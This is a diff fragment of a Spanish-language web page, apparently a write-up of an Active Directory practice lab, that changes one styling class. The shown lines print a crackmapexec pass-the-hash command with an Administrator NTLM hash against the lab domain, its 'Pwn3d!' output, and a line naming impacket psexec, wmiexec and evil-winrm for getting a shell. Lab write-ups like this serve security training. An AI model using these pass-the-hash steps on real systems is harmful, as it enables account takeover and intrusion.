@@ -451,7 +451,7 @@ ATTACKTIVEDIREC$:des-cbc-md5:9426b6febf6dc2ab
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ crackmapexec </span><span class="p">smb spookysec.local -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
 </span><span class="az">SMB         </span><span class="p">10.10.227.11    445    ATTACKTIVEDIREC  </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:ATTACKTIVEDIREC) (domain:spookysec.local) (signing:True) (SMBv1:False)  
-</span><span class="az">SMB         </span><span class="p">10.10.227.11    445    ATTACKTIVEDIREC  </span><span class="az">[+] </span><span class="p">spookysec.local\Administrator:0e0363213e37b94221497260b0bcb4fc </span><span class="am">(Pwn3d!)</span>
+</span><span class="az">SMB         </span><span class="p">10.10.227.11    445    ATTACKTIVEDIREC  </span><span class="ve">[+] </span><span class="p">spookysec.local\Administrator:0e0363213e37b94221497260b0bcb4fc </span><span class="am">(Pwn3d!)</span>
 </code></pre></div></div><br>
 
 <p class="plain-text">En este punto con un <code class="language-plaintext highlighter-rouge">passthehash</code> podemos obtener una <code class="language-plaintext highlighter-rouge">powershell</code> haciendo uso de <code class="language-plaintext highlighter-rouge">impacket</code> con <code class="language-plaintext highlighter-rouge">psexec</code> y <code class="language-plaintext highlighter-rouge">wmiexec</code> o simplemente por <code class="language-plaintext highlighter-rouge">winrm</code> con <code class="language-plaintext highlighter-rouge">evil-winrm</code></p>
